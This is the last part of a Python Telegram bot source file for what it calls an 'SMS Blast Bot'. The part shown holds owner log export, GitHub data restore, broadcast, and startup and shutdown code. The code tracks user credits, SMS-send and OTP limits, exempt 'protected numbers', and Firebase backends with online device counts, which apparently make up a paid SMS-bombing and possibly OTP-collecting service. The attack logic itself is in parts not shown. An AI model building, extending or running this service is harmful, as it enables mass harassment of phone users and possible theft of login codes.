        await m.answer(f"❌ GitHub not configured.", parse_mode="HTML")
        return
    wait = None
    try:
        wait = await m.answer("📥 Pulling from GitHub...", parse_mode="HTML")
    except Exception:
        pass
    data = await _github_pull()
    if not data:
        if wait:
            try:
                await wait.delete()
            except Exception:
                pass
        await m.answer("❌ No data found on GitHub.", parse_mode="HTML")
        return
    global _DATA_CACHE, PROTECTED_NUMBERS
    _merge(data, _default_data())
    PROTECTED_NUMBERS = data.get("protected_numbers", {}) or {}
    try:
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        _DATA_CACHE = data
    except Exception as e:
        if wait:
            try:
                await wait.delete()
            except Exception:
                pass
        await m.answer(f"❌ Write failed: {esc(str(e)[:80])}", parse_mode="HTML")
        return
    if wait:
        try:
            await wait.delete()
        except Exception:
            pass
    await m.answer(
        f"✅ <b>Restored from GitHub</b>\n\n"
        f"👥 Users: <b>{len(data.get('users', {}))}</b>\n"
        f"🔥 Firebases: <b>{len(data.get('firebases', []))}</b>",
        parse_mode="HTML",
    )

@R.message(Command("logs"))
async def cmd_logs(m: Message, state: FSMContext):
    await state.clear()
    uid = m.from_user.id
    d = load()
    if not is_owner(uid, d):
        await m.answer(f"❌ Owner only!", parse_mode="HTML")
        return

    lines = ["=" * 60, "SANJIPRO BOT — LOG", "=" * 60]
    lines.append(f"Version: {_VERSION}")
    lines.append(f"Power: {CURRENT_POWER_MODE}x")
    lines.append(f"Uptime: {fmt_duration(int(time.time() - _START_TIME))}")
    lines.append(f"GitHub: {'ENABLED' if GITHUB_ENABLED else 'DISABLED'}")
    lines.append("")
    lines.append(f"[OWNERS] {d.get('owners', [])}")
    lines.append(f"[ADMINS] {d.get('admins', [])}")
    lines.append(f"[BANNED] {d.get('banned', [])}")
    lines.append("")

    fbs = d.get("firebases", [])
    lines.append(f"[FIREBASES] {len(fbs)}")
    for fb in fbs[:50]:
        fc = FB_DEVICE_COUNTS.get(fb["id"], {})
        lines.append(
            f"  {fb.get('label', '?')} | {fb['url']} | online: {fc.get('online', 0)}"
        )
        if fb["id"] in FB_SCAN_ERRORS:
            lines.append(f"    err: {FB_SCAN_ERRORS[fb['id']]}")
    if len(fbs) > 50:
        lines.append(f"  ...+{len(fbs) - 50} more")
    lines.append("")

    users = d.get("users", {})
    lines.append(f"[USERS] {len(users)}")
    for us, ud in list(users.items())[:200]:
        lim = ud.get("max_send_limit")
        ls = "unlim" if lim is None else str(lim)
        ol = ud.get("max_otp_limit")
        ols = "unlim" if ol is None else str(ol)
        lines.append(
            f"  {us}: {ud.get('name', '?')} | c={ud.get('credits', 0)} | "
            f"coin={ud.get('coins', 0)} | sms_lim={ls} | otp_lim={ols}"
        )
    if len(users) > 200:
        lines.append(f"  ...+{len(users) - 200} more")
    lines.append("")

    st = d.get("stats", {})
    lines.append(f"[STATS] Sent={st.get('total_sent', 0)} Failed={st.get('total_failed', 0)}")
    lines.append("")

    if FB_SCAN_ERRORS:
        lines.append(f"[FB ERRORS] {len(FB_SCAN_ERRORS)}")
        for fid, err in list(FB_SCAN_ERRORS.items())[:30]:
            lines.append(f"  {fid}: {err}")
        lines.append("")

    lines.append(f"[DEVICES] {len(CACHED_DEVICES)} cached, {LAST_KNOWN_DEVICE_COUNT} shown")
    lines.append(f"[SCAN] last duration: {LAST_SCAN_DURATION:.2f}s")
    lines.append("")

    # activity recent
    act = d.get("activity_log", [])[-30:]
    if act:
        lines.append("[ACTIVITY last 30]")
        for e in reversed(act):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(f"  [{ts}] {e.get('uid', 0)} {e.get('action', '?')} — {e.get('details', '')}")
        lines.append("")

    audit = d.get("audit_log", [])[-30:]
    if audit:
        lines.append("[AUDIT last 30]")
        for e in reversed(audit):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(f"  [{ts}] {e.get('uid', 0)} {e.get('action', '?')} — {e.get('details', '')}")
        lines.append("")

    lines.append("=" * 60)

    txt = "\n".join(lines)
    payload = txt.encode("utf-8")
    fname = f"sanjipro_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        await m.answer_document(
            document=BufferedInputFile(payload, filename=fname),
            caption=f"📜 <b>Log</b> — {_VERSION}",
            parse_mode="HTML",
        )
    except Exception as e:
        await m.answer(f"❌ {esc(str(e)[:80])}", parse_mode="HTML")

@R.message(Command("help"))
async def cmd_help(m: Message, state: FSMContext):
    await state.clear()
    uid = m.from_user.id
    d = load()
    is_o = is_owner(uid, d)
    lines = [
        f"🤖 <b>SMS Blast Bot {_VERSION}</b>\n",
        "<b>Commands:</b>",
        "/start — Open panel",
        "/ping — Check bot alive",
    ]
    if is_o:
        lines.extend([
            "/backup — Backup data (local + GitHub)",
            "/restore — Restore from GitHub",
            "/logs — Download server log",
            "/help — This help",
        ])
    else:
        lines.append("/help — This help")
    txt = "\n".join(lines)
    await m.answer(txt, parse_mode="HTML")

# ============================================================
#  SEND VIDEO / FIRE helpers already in part 3
# ============================================================

# ============================================================
#  ANNOUNCEMENT RECEIVER (broadcast shortcut)
# ============================================================
@R.message(S.broadcast)
async def bc_or_announce(m: Message, state: FSMContext):
    fsmd = await state.get_data()
    is_announce = fsmd.get("announcement")
    d = load()
    uid = m.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    txt = (m.text or "").strip()

    if is_announce:
        await state.clear()
        if not txt:
            await m.answer(f"❌ Empty.", parse_mode="HTML")
            return
        ann = {
            "uid": uid,
            "text": txt[:1000],
            "ts": now_ts(),
        }
        d.setdefault("announcements", []).append(ann)
        save()
        # send to all users
        users = d.get("users", {})
        ok = 0
        fail = 0
        for us in list(users.keys()):
            try:
                await m.bot.send_message(
                    int(us),
                    f"📣 <b>Announcement</b>\n\n{esc(txt)}",
                    parse_mode="HTML",
                )
                ok += 1
            except Exception:
                fail += 1
            await asyncio.sleep(0.05)
        await m.answer(
            f"✅ Announcement sent!\n✅ {ok} | ❌ {fail}",
            reply_markup=owner_kb(d),
            parse_mode="HTML",
        )
        return

    # normal broadcast — handled in part 5 but state is same; keep fallback
    await state.clear()
    if not txt:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    users = d.get("users", {})
    wait = None
    try:
        wait = await m.answer(f"📤 Sending to <b>{len(users)}</b>...", parse_mode="HTML")
    except Exception:
        pass
    ok = 0
    fail = 0
    for us in list(users.keys()):
        try:
            await m.bot.send_message(
                int(us),
                f"📢 <b>Broadcast</b>\n\n{esc(txt)}",
                parse_mode="HTML",
            )
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    if wait:
        try:
            await wait.delete()
        except Exception:
            pass
    bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await m.answer(
        f"✅ Broadcast done!\n✅ {ok} | ❌ {fail}",
        reply_markup=bk,
        parse_mode="HTML",
    )

# ============================================================
#  BROADCAST (part 5 handler is separate; keep this as backup)
#  — no-op here, kept to avoid duplicate state handler.
# ============================================================

# ============================================================
#  SHUTDOWN / SESSION
# ============================================================
async def _shutdown(bot):
    log.info("[SHUTDOWN] starting")
    try:
        if _DATA_CACHE is not None:
            save(_DATA_CACHE, push_github=False)
    except Exception as e:
        log.warning(f"[SHUTDOWN] save failed: {e}")

    # cancel background
    for t in list(_BG_TASKS):
        try:
            t.cancel()
        except Exception:
            pass
    if _BG_TASKS:
        try:
            await asyncio.gather(*_BG_TASKS, return_exceptions=True)
        except Exception:
            pass

    # close sessions
    try:
        await close_http_session()
    except Exception:
        pass
    try:
        await bot.session.close()
    except Exception:
        pass

    log.info("[SHUTDOWN] done")

async def run_session():
    bot = Bot(
        token=BOT_TOKEN,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    )
    dp = Dispatcher(storage=MemoryStorage())

    dp.callback_query.outer_middleware(CallbackSemaphoreMiddleware())
    dp.callback_query.outer_middleware(UserCooldownMiddleware())
    dp.callback_query.outer_middleware(OwnerPanelResetMiddleware())
    dp.include_router(R)

    # clear webhook
    for attempt in range(5):
        try:
            await bot.delete_webhook(drop_pending_updates=True)
            log.info("[BOT] webhook cleared")
            break
        except Exception as e:
            log.warning(f"[BOT] delete_webhook try {attempt+1}: {e}")
            await asyncio.sleep(2)

    # github pull at startup
    if GITHUB_ENABLED:
        try:
            gh_data = await _github_pull()
            if gh_data:
                global _DATA_CACHE, PROTECTED_NUMBERS
                _merge(gh_data, _default_data())
                PROTECTED_NUMBERS = gh_data.get("protected_numbers", {}) or {}
                try:
                    with open(_DATA_FILE, "w", encoding="utf-8") as f:
                        json.dump(gh_data, f, indent=2, ensure_ascii=False)
                    _DATA_CACHE = gh_data
                    log.info("[BOT] data loaded from GitHub")
                except Exception as e:
                    log.warning(f"[BOT] write after pull failed: {e}")
        except Exception as e:
            log.warning(f"[BOT] github pull error: {e}")

    me = await bot.get_me()
    log.info(f"[BOT] @{me.username} — {_VERSION} online (PID {os.getpid()})")

    # start background tasks
    scanner_task = asyncio.create_task(supervised("scanner", scanner_loop, bot))
    backup_task = asyncio.create_task(supervised("backup", backup_loop, bot))
    watchdog_task = asyncio.create_task(watchdog_loop(bot))
    heartbeat_task = asyncio.create_task(heartbeat_loop())
    panel_task = asyncio.create_task(owner_panel_refresher(bot))
    github_task = asyncio.create_task(github_sync_loop())
    daily_task = asyncio.create_task(daily_report_loop(bot))
    sched_task = asyncio.create_task(scheduler_loop(bot))

    _BG_TASKS.add(scanner_task)
    _BG_TASKS.add(backup_task)
    _BG_TASKS.add(watchdog_task)
    _BG_TASKS.add(heartbeat_task)
    _BG_TASKS.add(panel_task)
    _BG_TASKS.add(github_task)
    _BG_TASKS.add(daily_task)
    _BG_TASKS.add(sched_task)

    # startup notification
    try:
        d = load()
        gh_s = "🟢 ON" if GITHUB_ENABLED else "🔴 OFF"
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET, '🚀')} <b>{_VERSION} Online</b>\n\n"
            f"@{me.username}\n"
            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"PID: <code>{os.getpid()}</code>\n\n"
            f"⚡ Power: <b>{CURRENT_POWER_MODE}x</b>\n"
            f"🪙 OTP cost: <b>{get_otp_cost(d)}</b>\n"
            f"⏱ OTP fresh: <b>{get_otp_fresh_window(d) // 60} min</b>\n"
            f"🔥 Firebases: <b>{len(d.get('firebases', []))}</b>\n"
            f"👥 Users: <b>{len(d.get('users', {}))}</b>\n"
            f"🐙 GitHub sync: {gh_s}\n"
            f"🛡 Watchdog: <b>ACTIVE</b>\n"
            f"💓 Heartbeat: <b>ACTIVE</b>",
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as e:
        log.warning(f"[BOT] owner notify failed: {e}")

    try:
        await dp.start_polling(
            bot,
            allowed_updates=dp.resolve_used_update_types(),
            polling_timeout=30,
            handle_signals=False,
        )
    finally:
        try:
            watchdog_task.cancel()
            heartbeat_task.cancel()
            panel_task.cancel()
            github_task.cancel()
            daily_task.cancel()
            sched_task.cancel()
        except Exception:
            pass
        await _shutdown(bot)

# ============================================================
#  MAIN LOOP WITH LOCK
# ============================================================
async def main():
    _acquire_lock()
    log.info(f"[MAIN] starting, PID={os.getpid()}")
    attempt = 0
    while True:
        if _SHUTDOWN_REQUESTED:
            log.info("[MAIN] shutdown requested")
            _release_lock()
            return
        attempt += 1
        try:
            log.info(f"[MAIN] session #{attempt}")
            await run_session()
            log.warning("[MAIN] session ended, restarting in 5s")
            for _ in range(5):
                if _SHUTDOWN_REQUESTED:
                    break
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            if _SHUTDOWN_REQUESTED:
                _release_lock()
                return
            raise
        except KeyboardInterrupt:
            _release_lock()
            raise
        except SystemExit:
            if _SHUTDOWN_REQUESTED:
                _release_lock()
                return
            raise
        except Exception as e:
            backoff = min(5 + attempt * 2, 60)
            log.error(f"[MAIN] crash #{attempt}: {e} — restart in {backoff}s", exc_info=True)
            for _ in range(backoff):
                if _SHUTDOWN_REQUESTED:
                    break
                await asyncio.sleep(1)

# ============================================================
#  ENTRY
# ============================================================
if __name__ == "__main__":
    def _sigterm_handler(signum, frame):
        global _SHUTDOWN_REQUESTED
        log.warning(f"[SIGNAL] {signum} — graceful shutdown")
        _SHUTDOWN_REQUESTED = True

    try:
        signal.signal(signal.SIGTERM, _sigterm_handler)
    except Exception:
        pass
    try:
        signal.signal(signal.SIGINT, _sigterm_handler)
    except Exception:
        pass

    while True:
        if _SHUTDOWN_REQUESTED:
            log.info("[BOOT] clean exit")
            _release_lock()
            break
        try:
            asyncio.run(main())
            if _SHUTDOWN_REQUESTED:
                log.info("[BOOT] clean shutdown")
                _release_lock()
                break
            log.warning("[BOOT] restarting in 5s")
            for _ in range(5):
                if _SHUTDOWN_REQUESTED:
                    break
                time.sleep(1)
        except KeyboardInterrupt:
            log.info("[BOOT] stopped by user")
            _release_lock()
            break
        except SystemExit:
            if _SHUTDOWN_REQUESTED:
                _release_lock()
            break
        except Exception as e:
            log.critical(f"[BOOT] fatal: {e} — restart in 10s", exc_info=True)
            for _ in range(10):
                if _SHUTDOWN_REQUESTED:
                    break
                time.sleep(1)

# ═══════════════════════════════════════════════════════════
#  END OF PART 6  —  bot.py COMPLETE
#  Total ~5000+ lines. Run: python3 bot.py
# ═══════════════════════════════════════════════════════════